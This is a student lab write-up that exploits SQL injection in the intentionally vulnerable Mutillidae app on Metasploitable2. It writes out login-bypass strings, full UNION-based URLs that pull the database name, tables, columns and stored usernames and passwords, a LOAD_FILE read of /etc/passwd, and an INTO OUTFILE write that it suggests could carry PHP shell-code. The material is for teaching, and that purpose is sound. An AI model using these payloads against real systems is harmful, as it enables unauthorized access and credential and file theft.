# EX-8.Sqlinjection
## Date:30/04/2024
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 

Identify IP address using ifconfig in Metasploitable2

![8_1](https://github.com/Darkwebnew/sqlinjection/assets/143114486/6a571f13-1aa9-4525-a418-02c8d7c4600f)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/491168a2-1e5a-4261-8eb7-87466ea409d1)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/44da8ddb-24e8-47ab-8f20-e30fab33ac52)

Click on the menu Login/Register and register for an account

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/1ff74f5d-ef9a-48fc-a42e-63f61841f81d)

Click on the link “Please register here”

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/63593e27-ec93-4b3b-aea3-5f9aae658dbe)

Click on “Create Account” to display the following page:

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/267381ea-e27d-41a6-be11-0ce3e366ffde)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/8b05121f-ba8b-4e93-8f76-543264a0b613)

Click “Login”. The logged in page will show as below:

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/a8af66dd-3c8d-4b58-9185-d6ba377238cb)

## Bypassing login field

<p>The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”
=================================================================
If you face error in registration follow the following steps in metasploitable 2:</p>

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/10866ea7-7a49-4f24-9077-b82d224269ed)

This issue is caused by a misconfiguration in the config.inc located in the /var/www/mutillidae folder on Metasploitable 2 VM.

Edit config.inc
Edit config.inc file located in /var/www/mutillidae folder on Metasploitable 2 by typing the following commands [one at the time]:

```
cd /
sudo nano /var/www/mutillidae/config.inc
```

Type msfadmin when prompted for the root password. 
Once nano opens config.inc file, look for the line $dbname = ‘metasploit’ as shown in Figure  below:

![8_11](https://github.com/Darkwebnew/sqlinjection/assets/143114486/30f84bf3-e028-426e-b6fe-fced72129b2b)

Replace ‘metasploit’ with ‘owasp10’ and make sure the lines end with semicolon ; as shown in Figure

![8_12](https://github.com/Darkwebnew/sqlinjection/assets/143114486/8dcba905-723e-4d87-bd1f-d2e4e9366f3a)

Save and exit the config.inc
Save than exit the config.inc file by typing CTRL+X keys on your keyboard and the Y [Enter] when prompted to save the file
Restart the Apache server
To restart Apache, type the following command in the terminal. Alternatively, you can just reboot Metasploitalbe 2 VM.

```
sudo /etc/init.d/apache2 reload
```

![8_15](https://github.com/Darkwebnew/sqlinjection/assets/143114486/2175ebf4-051c-4024-aaa6-477c620479a4)

Reset Mutillidae database
Refresh the page then clicking on the Reset DB menu option to reset the Mutillidae database [Figure ]. Click OK when prompted.

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/1dedfb5a-8646-487b-88b9-cb04dccda6f4)

Test the new configuration
Alright. Now is time to test if we managed to fix the database issue. Go ahead and register a new account on the Mutillidae webpage.

The Mutillidae database error no longer appears 

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/0197810b-b7e6-483c-9d7b-f0d9c06a6f10)

===============================================================

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/172e8311-71e7-4573-a45c-8f7721970dd1)

Click the login button and you will see it enter into the administrator page.

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/9ef637a5-342a-4546-b439-af83a929d7fb)

## Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/c70b639a-2ed3-46dc-ab39-da28ce20f487)

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/367740ed-dfe7-4c1d-a648-d5d79281359d)

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/c032a67a-645a-4077-9480-b70c8d60bac9)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/0ad6bb5a-448d-4f47-8e1d-de95b38277e9)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

```

http://192.168.43.83/mutillidae/index.php?page=user-info.php&username=Harish%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

```

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/027ecd69-c0fb-444d-a29e-ce1cdcdba5ad)

After adding the order by 6 into the existing url , the following error statement will be obtained:

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/57fa448c-a7e8-4395-88ee-a53c80a86fbf)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.


As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/864f26e8-e765-4fc4-b42d-81f9f2f0666e)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/ec2e02a3-b309-49ab-9f14-000dfc51e080)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/a334f3f5-cce1-4416-b04f-57d3434d1a5f)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

```

http://192.168.43.83/mutillidae/index.php?page=user-info.php&username=Harish%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

```

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/8b92e232-8dc1-48e8-8871-56fbd24bfd08)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

```

http://192.168.43.83/mutillidae/index.php?page=user-info.php&username=Harish%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

```

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/5446bb17-3aaa-4b6d-80b2-51e3fdf34e65)

The url once executed will  retrieve table names from the “owasp 10” database.
## Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/806c976e-6149-4007-bcd1-7daa091e7a56)

The column names of the accounts is displayed below for the following url:

```

http://192.168.43.83/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

```

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/d55a98fc-4724-458d-a31a-d9294a200131)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.43.83/mutillidae/index.php?page=user-info.php&username=Harish%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/6f6e2f30-2f05-4892-8bab-ee41700757d0)

![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/70883aa3-1f5f-44c8-a66c-1f0fb0ae239a)

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

```

http://192.168.43.83/mutillidae/index.php?page=user-info.php&username=Harish%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

```
![image](https://github.com/Darkwebnew/sqlinjection/assets/143114486/0c963cd5-bb7b-45ef-a334-fea971167f72)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).



## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
